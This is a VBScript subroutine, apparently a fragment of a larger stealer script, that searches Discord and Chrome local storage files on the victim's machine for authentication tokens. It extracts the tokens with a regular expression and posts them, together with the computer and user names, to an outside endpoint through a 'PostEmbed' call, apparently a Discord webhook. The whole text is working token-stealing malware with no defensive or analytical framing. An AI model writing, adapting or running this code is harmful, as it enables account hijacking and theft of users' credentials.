Sub GrabDiscordTokens()
    Dim discordPaths(2)
    discordPaths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Discord\Local Storage\leveldb"
    discordPaths(1) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Discord\Local Storage"
    discordPaths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
    
    Dim tokens: tokens = ""
    Dim folder, file, fso, content, regex, matches
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set regex = New RegExp
    regex.Pattern = """([^""]*token[^""]*)""\s*:\s*""([^""]+)"""
    regex.Global = True
    
    For Each folderPath In discordPaths
        If fso.FolderExists(folderPath) Then
            Set folder = fso.GetFolder(folderPath)
            For Each file In folder.Files
                If InStr(file.Name, ".ldb") > 0 Or InStr(file.Name, ".log") > 0 Then
                    content = ReadFile(file.Path)
                    Set matches = regex.Execute(content)
                    For Each match In matches
                        If InStr(match.SubMatches(0), "token") > 0 Then
                            tokens = tokens & match.SubMatches(1) & vbLf
                        End If
                    Next
                End If
            Next
        End If
    Next
    
    If Len(tokens) > 0 Then
        Call PostEmbed("Discord Tokens", "Tokens found:" & vbLf & tokens & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16753920)
    Else
        Call PostEmbed("Discord Tokens - None Found", "No tokens detected." & vbLf & "PC: " & PC, 16711680)
    End If
End Sub
